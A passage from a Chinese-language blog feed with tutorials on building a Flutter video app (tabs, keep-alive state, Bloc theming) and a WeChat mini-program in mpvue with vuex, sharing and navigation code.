<li>还有一种更简洁的。<br>使用wasm-gc去处理。</li>
</ul>
]]></content>
      <tags>
        <tag>webAssembly</tag>
      </tags>
  </entry>
  <entry>
    <title>鹰眼视频 (二)</title>
    <url>/posts/47bb6d5/</url>
    <content><![CDATA[<h2 id="Flutter-鹰眼视频"><a href="#Flutter-鹰眼视频" class="headerlink" title="Flutter - 鹰眼视频"></a>Flutter - 鹰眼视频</h2><p>鹰眼视频 App 相关技术知识点,主要介绍如下几点技巧!</p>
<img src="/posts/47bb6d5/home.png" class="" title="鹰眼视频">

<ul>
<li>TabBar</li>
<li>TabBarView</li>
<li>DefaultTabController</li>
<li>tab 切换时阻止 widget 重绘</li>
</ul>
<a id="more"></a>

<h3 id="TabBar"><a href="#TabBar" class="headerlink" title="TabBar"></a>TabBar</h3><p>Tab 页的 Title 控件，切换 Tab 页的入口，一般放到 AppBar 控件下使用，内部有*Title 属性。其子元素按水平横向排列布局，如果需要纵向排列，请使用 Column 或 ListView 控件包装一下。子元素为 Tab 类型的数组。</p>
<h3 id="TabBarView"><a href="#TabBarView" class="headerlink" title="TabBarView"></a>TabBarView</h3><p>Tab 页的内容容器，其内放置 Tab 页的主体内容。子元素可以是多个各种类型的控件。</p>
<h3 id="DefaultTabController"><a href="#DefaultTabController" class="headerlink" title="DefaultTabController"></a>DefaultTabController</h3><p>DefaultTabController，是一个默认的 tabView 控制器。不需要自己去维护 controller,由组件去维护。</p>
<h3 id="tab-切换时阻止-widget-重绘"><a href="#tab-切换时阻止-widget-重绘" class="headerlink" title="tab 切换时阻止 widget 重绘"></a>tab 切换时阻止 widget 重绘</h3><p>因为 Flutter 为了节约内存不会保存 widget 的状态，widget 都是临时变量。当我们使用 TabBar，TabBarView 是我们就会发现，切换 tab 后再重新切换回上一页面，这时候 tab 会重新加载重新创建，体验很不友好。不过 Flutter 还是为我们提供了解决办法。我们可以强制 widget 不显示情况下保留状态，下回再加载时就不用重新创建了。</p>
<p>AutomaticKeepAliveClientMixin 是一个抽象状态，使用也很简单，我们只需要用我们自己的状态继承这个抽象状态，并实现 wantKeepAlive 方法即可。</p>
<p>继承这个状态后，widget 在不显示之后也不会被销毁仍然保存在内存中，所以慎重使用这个方法。</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_VideoList</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">VideoList</span>&gt; <span class="title">with</span> <span class="title">AutomaticKeepAliveClientMixin</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当页面不显示的时候也常驻在内存中</span></span><br><span class="line">  <span class="meta">@protected</span></span><br><span class="line">  <span class="built_in">bool</span> <span class="keyword">get</span> wantKeepAlive=&gt;<span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Demo-源码"><a href="#Demo-源码" class="headerlink" title="Demo 源码"></a>Demo 源码</h3><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:flutter/material.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/view/VideoList.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomePage</span> <span class="keyword">extends</span> <span class="title">StatefulWidget</span> </span>&#123;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  _HomePageState createState() =&gt; _HomePageState();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_HomePageState</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">HomePage</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义需要展示的 选项卡</span></span><br><span class="line"><span class="keyword">final</span> <span class="built_in">List</span>&lt;Tab&gt; myTabs = &lt;Tab&gt;[</span><br><span class="line">    <span class="keyword">new</span> Tab(text: <span class="string">&#x27;推荐&#x27;</span>),</span><br><span class="line">    <span class="keyword">new</span> Tab(text: <span class="string">&#x27;搞笑&#x27;</span>),</span><br><span class="line">    <span class="keyword">new</span> Tab(text: <span class="string">&#x27;健康&#x27;</span>),</span><br><span class="line">    <span class="keyword">new</span> Tab(text: <span class="string">&#x27;美女&#x27;</span>),</span><br><span class="line">    <span class="keyword">new</span> Tab(text: <span class="string">&#x27;历史&#x27;</span>),</span><br><span class="line">    <span class="keyword">new</span> Tab(text: <span class="string">&#x27;汽车&#x27;</span>)</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  Widget build(BuildContext context) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> DefaultTabController(</span><br><span class="line">        length: myTabs.length,</span><br><span class="line">        child: <span class="keyword">new</span> Scaffold(</span><br><span class="line">            appBar: AppBar(</span><br><span class="line">                bottom: <span class="keyword">new</span> TabBar(</span><br><span class="line">                  tabs: myTabs,</span><br><span class="line">                  isScrollable: <span class="keyword">true</span>,</span><br><span class="line">                ),</span><br><span class="line">            ),</span><br><span class="line">            body: <span class="keyword">new</span> TabBarView(</span><br><span class="line">                children: myTabs.map((Tab tab) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> Center(</span><br><span class="line">                        <span class="comment">// 此处我把VideoList进行了封装，导入使用就可以。</span></span><br><span class="line">                        child: <span class="keyword">new</span> VideoList(tab.text)</span><br><span class="line">                    );</span><br><span class="line">                &#125;).toList(),</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>Dart 语言还是有着独特的魅力，总是诱导我走向错误的边缘。Dart 是一个强类型的语言可不能按照 js 的标准去使用，要按照 TypeScript 标准去适应。<br>到了 Flutter 中，就需要大量的使用泛型、Map、List Json 与 ModelClass 的转换，差不多都是 java 的那一套方法论！</p>
]]></content>
      <tags>
        <tag>flutter</tag>
      </tags>
  </entry>
  <entry>
    <title>鹰眼视频 (三)</title>
    <url>/posts/7a8896fe/</url>
    <content><![CDATA[<h2 id="Flutter-鹰眼视频"><a href="#Flutter-鹰眼视频" class="headerlink" title="Flutter - 鹰眼视频"></a>Flutter - 鹰眼视频</h2><p>鹰眼视频 App 相关技术知识点,主要介绍如下几点技巧!</p>
<ul>
<li>状态管理 - bloc</li>
<li>动态设置视频比例</li>
</ul>
<a id="more"></a>
<h2 id="状态管理"><a href="#状态管理" class="headerlink" title="状态管理"></a>状态管理</h2><p>Flutter 的状态管理 有多种方案，如：</p>
<ul>
<li>RxDart</li>
<li>Redux</li>
<li>Bloc</li>
</ul>
<p>这里只介绍一种，基于Stream概念的状态管理方案。Bloc是对RxDart的进一步封装。对于Flutter有Flutter_bloc粘性组件，负责去呈现最新的状态。</p>
<h3 id="Bloc-官方概念"><a href="#Bloc-官方概念" class="headerlink" title="Bloc 官方概念"></a>Bloc 官方概念</h3><blockquote>
<p>Bloc可以轻松地将表示与业务逻辑分离，使代码快速，易于测试和重用。</p>
</blockquote>
<p>Bloc的设计考虑了三个核心价值观：</p>
<ul>
<li><p>简单<br>  易于理解，便于使用。</p>
</li>
<li><p>强大<br>  通过组合较小的组件来制作令人惊叹的复杂应用程序。</p>
</li>
<li><p>可测试<br>  轻松测试应用程序的各个方面，以便我们可以放心地进行迭代。</p>
</li>
</ul>
<p>Bloc尝试通过调节何时可以发生状态更改来实现状态更改，并在整个应用程序中强制执行单一方式来更改状态。</p>
<p>由于Bloc是通过Event去传递的。所以我们需要去定义相应的事件源。</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ThemeEvent</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ChangeTheme</span> <span class="keyword">extends</span> <span class="title">ThemeEvent</span> </span>&#123;</span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  <span class="built_in">String</span> toString() =&gt; <span class="string">&#x27;ChangeTheme&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>抽象类 ThemeEvent 是事件祖宗，所有的事件类我们都去继承它。这样在Bloc中就可以方便的判断这个事件是否是 ThemeEvent 类型下的以及 事件传递的 单一原则。避免混淆 想传递多个，泛型是个好东西！</p>
<p>接下来，我们需要再定义ThemeBloc类，这个类必须去继承 Bloc 基础类.<br>Bloc 支持所有类型， 这里只用到 布尔类型，就不在编写一个 类去做状态存放了。直接使用形参即可。</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThemeBloc</span> <span class="keyword">extends</span> <span class="title">Bloc</span>&lt;<span class="title">ThemeEvent</span>,<span class="title">bool</span>&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> changeTheme() <span class="keyword">async</span>&#123;</span><br><span class="line">    dispatch(ChangeTheme());</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  <span class="built_in">bool</span> <span class="keyword">get</span> initialState =&gt; <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  <span class="keyword">void</span> onTransition(Transition&lt;ThemeEvent, <span class="built_in">bool</span>&gt; transition) <span class="keyword">async</span>&#123;</span><br><span class="line">    <span class="built_in">print</span>(transition.toString());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  Stream&lt;<span class="built_in">bool</span>&gt; mapEventToState(<span class="built_in">bool</span> state, ThemeEvent event) <span class="keyword">async</span>* &#123;</span><br><span class="line">    <span class="keyword">if</span>(event <span class="keyword">is</span> ChangeTheme)&#123;</span><br><span class="line">      <span class="keyword">yield</span> !state;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>onTransition 提供了对stream的过滤操作。</p>
<h3 id="反应组件"><a href="#反应组件" class="headerlink" title="反应组件"></a>反应组件</h3><p>在ui中去呈现BLoc中状态时，需要使用Flutter_bloc组件库去做桥梁。Flutter_bloc是进一步的封装。</p>
<p>我们需要在一个APP程序的开始处引入Bloc。</p>
<blockquote>
<p>import ‘package:flutter_bloc/flutter_bloc.dart’;</p>
</blockquote>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RootPage</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">Root</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">  ThemeBloc themeBloc = ThemeBloc();</span><br><span class="line">  <span class="comment">// new 一个 themeBloc 状态管理对象</span></span><br><span class="line"></span><br><span class="line">  <span class="meta">@override</span></span><br><span class="line">  Widget build(BuildContext context) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过 BlocProvider 去注入要处理的 bloc. 这里我们传入themeBloc!</span></span><br><span class="line">    <span class="keyword">return</span> BlocProvider&lt;ThemeBloc&gt;(</span><br><span class="line">        bloc: themeBloc,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过 BlocBuilder 去 监听要实时相应的bloc.这里我们传入themeBloc!</span></span><br><span class="line">        <span class="comment">// 该组件库 还提供了 builder 回掉事件，只要状态发生改变，这里就会自动重新build</span></span><br><span class="line">        child: BlocBuilder(</span><br><span class="line">          bloc: themeBloc,</span><br><span class="line">          builder: (BuildContext context, <span class="built_in">bool</span> state) &#123;</span><br><span class="line">            <span class="keyword">return</span> MaterialApp(</span><br><span class="line">              title: <span class="string">&#x27;鹰眼视频&#x27;</span>,</span><br><span class="line">              <span class="comment">// 在这里 去使用状态值， 判断是否为true 实现 主题的重新绑定。</span></span><br><span class="line">              theme: state ? MyTheme.lightTheme : MyTheme.darkTheme,</span><br><span class="line">              home: <span class="keyword">new</span> HomePage(),</span><br><span class="line">              routes: &lt;<span class="built_in">String</span>, WidgetBuilder&gt;&#123;</span><br><span class="line">                <span class="string">&#x27;/aboutPage&#x27;</span>: (BuildContext context) =&gt; <span class="keyword">new</span> AboutPage()</span><br><span class="line">              &#125;</span><br><span class="line">            );</span><br><span class="line">          &#125;,</span><br><span class="line">        ));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="事件To状态"><a href="#事件To状态" class="headerlink" title="事件To状态"></a>事件To状态</h3><p>在这里，我们能感受到 Bloc 的美，它把event转换成了state.</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="meta">@override</span></span><br><span class="line">Widget build(BuildContext context) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  取到上层注入的bloc,可使用 BlocProvider.of&lt;ThemeBloc&gt;(context);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> ThemeBloc themeBloc = BlocProvider.of&lt;ThemeBloc&gt;(context);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> IconButton(</span><br><span class="line">        icon: <span class="keyword">new</span> Icon(Icons.remove_red_eye),</span><br><span class="line">        onPressed: () &#123;</span><br><span class="line">            <span class="comment">// 在这里去触发我们之前定义的事件，实现状态的改变</span></span><br><span class="line">            themeBloc.changeTheme();</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>stream 可以看作一个 污水过滤器， 把污水从一端注入，从另一端流出清水。 污水转成清水 就是onTransition的功劳了，他负责了事件的执行，状态的修改！</p>
<p>其他页面的主题色可以通过**Theme.of(context)**去继承。</p>
<h2 id="动态设置视频比例"><a href="#动态设置视频比例" class="headerlink" title="动态设置视频比例"></a>动态设置视频比例</h2><p>在前2篇文章中，我介绍了<strong>video_player</strong>视频播放的组件库。</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">_videoPlayController = VideoPlayerController.network(_videoInfo.src )</span><br><span class="line">    ..addListener(() &#123;</span><br><span class="line">        <span class="comment">// .. 是Dart的语法糖。 链式调用的 写法</span></span><br><span class="line">        <span class="comment">//  根据视频设置 尺寸比例</span></span><br><span class="line">        <span class="keyword">final</span> <span class="built_in">double</span> aRatio = _videoPlayController.value.aspectRatio;</span><br><span class="line">        <span class="keyword">if</span> (_aRatio != aRatio) &#123;</span><br><span class="line">        setState(() &#123;</span><br><span class="line">            _aRatio = aRatio;</span><br><span class="line">        &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>

<p>想动态改变视频的比列，就需要知道每一个视频的大小。那么我们只需要去添加监听回掉方法即可。<br>通过<strong>addListener</strong>去实现监听。在<strong>_videoPlayController</strong>控制器中，是存在视频信息的。可以获取到size及aspectRatio.</p>
]]></content>
      <tags>
        <tag>flutter</tag>
      </tags>
  </entry>
  <entry>
    <title>七夕之日</title>
    <url>/posts/a4e34216/</url>
    <content><![CDATA[<h1 id="我爱你就像老鼠爱大米"><a href="#我爱你就像老鼠爱大米" class="headerlink" title="我爱你就像老鼠爱大米"></a>我爱你就像老鼠爱大米</h1>]]></content>
      <tags>
        <tag>私密</tag>
      </tags>
  </entry>
  <entry>
    <title>虎事小程序</title>
    <url>/posts/88e91fb0/</url>
    <content><![CDATA[<p>童年中的趣事是最最珍贵的。小时候，我们因为幼小无知而闹出了许多笑话，打开记忆的匣门，童年趣事便接踵而来。</p>
<p>做梦找到厕所，醒来尿床了</p>
<p>小时候穿着裆裤时，跟着小女孩跳皮筋</p>
<p>撒尿和泥，还玩的不亦乐乎</p>
<p>纠结自己要上清华还是北大，长大后发现想多了</p>
<a id="more"></a>

<p>用笔在自己胳膊上画手表，还舍不得洗掉</p>
<p>用放大镜烤蚂蚁（小时候居然那么残忍……）</p>
<p>老爸骑 28 自行车带我上街，忘了我已经先坐在后座上，偏腿上车，我就飞了出去…</p>
<p>听着这么一段小故事，或许都发现了这些虎事很有趣。</p>
<h3 id="功能展示"><a href="#功能展示" class="headerlink" title="功能展示"></a>功能展示</h3><ol>
<li>首页-视频播放 （同时只能播放一个视频特性）</li>
<li>点赞</li>
<li>分享</li>
<li>回复 （二级页面尚未完善）</li>
</ol>
<h3 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h3><h5 id="1-首页-视频播放-（实现统一时刻只能播放一个视频）"><a href="#1-首页-视频播放-（实现统一时刻只能播放一个视频）" class="headerlink" title="1. 首页-视频播放 （实现统一时刻只能播放一个视频）"></a>1. 首页-视频播放 （实现统一时刻只能播放一个视频）</h5><p>解决思路：无非就是找一个标识，作为全局变量去记录上次播放的视频。也可以使用循环的方式去实现，不过循环的方式非常的不友好，随着分页数据的加载回导致程序越来越慢！</p>
<p>方案实时：我使用的是** vuex **,不过也可以采取 ** Storage ** 本地存储的方式。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">handleVideoPlay</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.playFlag) &#123;</span><br><span class="line">          <span class="built_in">this</span>.ajaxVideoClick()</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.playFlag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">const</span> videoCtx = wx.createVideoContext(<span class="string">&#x27;video-&#x27;</span>+<span class="built_in">this</span>.video.id)</span><br><span class="line">        videoCtx.play()</span><br><span class="line">        <span class="comment">//用store定义的变量去判断</span></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params"><span class="built_in">this</span>.videoPlayId === -<span class="number">1</span></span>)</span>&#123;</span><br><span class="line">          <span class="comment">// 调用，修改 store中的 videoPlayId 值</span></span><br><span class="line">          <span class="built_in">this</span>[VideoPlayId](<span class="built_in">this</span>.video.id)</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> videoCtx1 = wx.createVideoContext(<span class="string">&#x27;video-&#x27;</span>+<span class="built_in">this</span>.videoPlayId)</span><br><span class="line">        videoCtx1.pause()</span><br><span class="line">        <span class="built_in">this</span>[VideoPlayId](<span class="built_in">this</span>.video.id)</span><br><span class="line">        <span class="comment">// videoCtx.requestFullScreen()</span></span><br><span class="line">      &#125;,</span><br></pre></td></tr></table></figure>

<h5 id="2-分享功能"><a href="#2-分享功能" class="headerlink" title="2. 分享功能"></a>2. 分享功能</h5><p>小程序如果想对外分享，必须在 page 里面定义 onShareAppMessage 函数，来配置页面分享转发相关的信息。</p>
<ul>
<li>只有定义了此事件处理函数，右上角菜单才会显示 “转发” 按钮</li>
<li>用户点击转发按钮的时候会调用</li>
<li>此事件需要 return 一个 Object，用于自定义转发内容</li>
</ul>
<p>一个页面可能会有多个分享，可以由插入的参数 options 来判断具体是由哪个位置进行分享，从而做不同的逻辑判断。</p>
<p>不过在 mpvue 中，需要把 onShareAppMessage 函数写在 export default { } 根节点中，与 methods 方法通级。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">onShareAppMessage</span>(<span class="params">res</span>)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> &#123;</span><br><span class="line">         title: <span class="string">&#x27;虎事小程序-&#x27;</span> + <span class="built_in">this</span>.video.auther,</span><br><span class="line">         path: <span class="built_in">this</span>.detaiUrl,</span><br><span class="line">         imageUrl: <span class="built_in">this</span>.video.img,</span><br><span class="line">         success: <span class="function"><span class="keyword">function</span> (<span class="params">shareTickets</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.info(shareTickets + <span class="string">&#x27;成功&#x27;</span>);</span><br><span class="line">           <span class="comment">// 转发成功</span></span><br><span class="line">         &#125;,</span><br><span class="line">         fail: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">           <span class="built_in">console</span>.log(res + <span class="string">&#x27;失败&#x27;</span>);</span><br><span class="line">           <span class="comment">// 转发失败</span></span><br><span class="line">         &#125;,</span><br><span class="line">         complete:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">           <span class="comment">// 不管成功失败都会执行</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-带参数跳转"><a href="#3-带参数跳转" class="headerlink" title="3. 带参数跳转"></a>3. 带参数跳转</h5><p>在微信小程序中，跳转有普通导航跳转和 tabar 跳转。在 mpvue 框架中进行跳转可以使用 ** a 标签 **去实现，也可以使用 ** wx.navigateTo() **。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳转</span></span><br><span class="line">wx.navigateTo(&#123; <span class="attr">url</span>: <span class="string">&quot;pages/detail/main?id&quot;</span> + <span class="built_in">this</span>.video.id &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 目的页面，参数的接收</span></span><br><span class="line"><span class="built_in">this</span>.videoId = <span class="built_in">this</span>.$root.$mp.query.id;</span><br></pre></td></tr></table></figure>

<h5 id="4-使用-scss-书写-css"><a href="#4-使用-scss-书写-css" class="headerlink" title="4. 使用 scss 书写 css"></a>4. 使用 scss 书写 css</h5><p>首先需要安装 node-scss 和 scss-loader</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install scss-loader --save-dev</span><br><span class="line">npm install node-scss --save-dev</span><br></pre></td></tr></table></figure>

<p>安装完毕就可以这样书写 css 代码了</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">&quot;scss&quot;</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.video</span> &#123;</span></span><br><span class="line">    margin-bottom: 10px;</span><br><span class="line">    overflow: hidden;</span><br><span class="line"><span class="css">    <span class="selector-class">.video-img</span> &#123;</span></span><br><span class="line">      overflow: hidden;</span><br><span class="line">      width: 100%;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果安装完，** <style lang='scss' scoped></style> ** 嵌套的代码，不智能提示，及 ** {}** 有红色波浪线警告，可以采用如下解决方案。</p>
<p>在 VsCode 编辑器中，点击 文件-首选项-设置 增加一下几行配置即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;files.associations&quot;: &#123;</span><br><span class="line">	&quot;*.css&quot;: &quot;scss&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="5-mpvue-中如何使用-vuex"><a href="#5-mpvue-中如何使用-vuex" class="headerlink" title="5.mpvue 中如何使用 vuex"></a>5.mpvue 中如何使用 vuex</h5><p>在 pages 根目录下创建 stores 的目录，并且新建 3 个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.js</span><br><span class="line">mutation-types.js</span><br><span class="line">mutations.js</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mutation-types.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取上次播放ID 用于结束上次播放的视频</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> VideoPlayId = <span class="string">&quot;VideoPlayId&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取微信用户信息 存有 openID</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> UserInfor = <span class="string">&quot;UserInfor&quot;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mutations.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; VideoPlayId, UserInfor &#125; <span class="keyword">from</span> <span class="string">&quot;./mutation-types&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  [VideoPlayId](state, v) &#123;</span><br><span class="line">    state.videoPlayId = v;</span><br><span class="line">  &#125;,</span><br><span class="line">  [UserInfor](state, v) &#123;</span><br><span class="line">    state.userInfo = v;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&quot;vuex&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> mutations <span class="keyword">from</span> <span class="string">&quot;./mutations&quot;</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(Vuex);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">  videoPlayId: -<span class="number">1</span>,</span><br><span class="line">  userInfo: &#123;&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state,</span><br><span class="line">  mutations,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>绑定 Store 到 mpvue</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">&quot;./App&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入Store</span></span><br><span class="line"><span class="keyword">import</span> Store <span class="keyword">from</span> <span class="string">&quot;./stores&quot;</span>;</span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span>;</span><br><span class="line">App.mpType = <span class="string">&quot;app&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定</span></span><br><span class="line">Vue.prototype.$store = Store;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(App);</span><br><span class="line">app.$mount();</span><br></pre></td></tr></table></figure>

<p>在使用的地方，需要吧 state 定义的变量，及触发的方法导出。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;button :<span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;&#123;logged: isLogged&#125;&quot;</span></span><br><span class="line">			open-type=<span class="string">&quot;getUserInfo&quot;</span> :lang=<span class="string">&quot;zh_CN&quot;</span></span><br><span class="line">			@click=<span class="string">&quot;doLogin&quot;</span></span><br><span class="line">	&gt;获取用户信息&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---开始 vuex</span></span><br><span class="line"><span class="keyword">import</span> &#123; mapState, mapMutations &#125; <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; UserInfor &#125; <span class="keyword">from</span> <span class="string">&#x27;@/stores/mutation-types&#x27;</span></span><br><span class="line"><span class="comment">// ---结束 vuex</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; get, showSuccess, showModal &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/index&#x27;</span></span><br><span class="line"><span class="keyword">import</span> qcloud <span class="keyword">from</span> <span class="string">&#x27;wafer2-client-sdk&#x27;</span></span><br><span class="line"><span class="keyword">import</span> config <span class="keyword">from</span> <span class="string">&#x27;./../../config&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  computed:&#123;</span><br><span class="line">    <span class="comment">// --- 导出 state 定义的 userInfo 变量</span></span><br><span class="line">    ...mapState([</span><br><span class="line">      <span class="string">&#x27;userInfo&#x27;</span></span><br><span class="line">    ]),</span><br><span class="line">    isLogged () &#123;</span><br><span class="line">      <span class="keyword">return</span> !!<span class="built_in">this</span>.userInfo[<span class="string">&#x27;openId&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    <span class="comment">/* --- 导出 Mutations 定义的 UserInfor变量用来，</span></span><br><span class="line"><span class="comment">		   修改Store.state的userInfo值 */</span></span><br><span class="line">    ...mapMutations([</span><br><span class="line">      UserInfor</span><br><span class="line">    ]),</span><br><span class="line">    <span class="function"><span class="title">doLogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      qcloud.login(&#123;</span><br><span class="line">        success: <span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">		  <span class="comment">// 调用Store 方法去修改</span></span><br><span class="line">          <span class="built_in">this</span>[UserInfor](res)</span><br><span class="line">          <span class="comment">// this.userInfo // 可以 直接访问</span></span><br><span class="line">        &#125;,</span><br><span class="line">   